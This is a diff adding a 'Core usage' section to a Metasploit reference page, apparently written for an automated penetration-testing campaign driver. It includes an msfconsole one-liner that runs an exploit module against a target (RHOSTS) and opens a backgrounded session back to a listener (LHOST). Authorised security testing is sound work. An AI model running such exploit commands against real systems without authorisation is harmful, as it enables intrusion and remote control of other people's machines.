@@ -12,6 +12,17 @@ phase: exploit
 
 Metasploit Framework is a Ruby-based, modular penetration testing platform that provides a unified environment for finding, exploiting, and post-exploiting vulnerabilities across networks and systems.
 
+## Core usage
+
+Non-interactive (the campaign driver emits this form so one command returns clean output instead of dropping into a prompt). `run -z` backgrounds the session so the command exits:
+
+```bash
+msfconsole -q -x 'search <cve-or-product>; exit'                                    # find a module
+msfconsole -q -x 'use <module>; set RHOSTS 10.1.1.5; set LHOST 10.9.0.5; run -z; sessions -l; exit'
+```
+
+Prefer a vetted module over a hand-rolled exploit for a known CVE: faster, more reliable, and the exploit logic lives in the module.
+
 ## Install / Setup
 
 ```bash
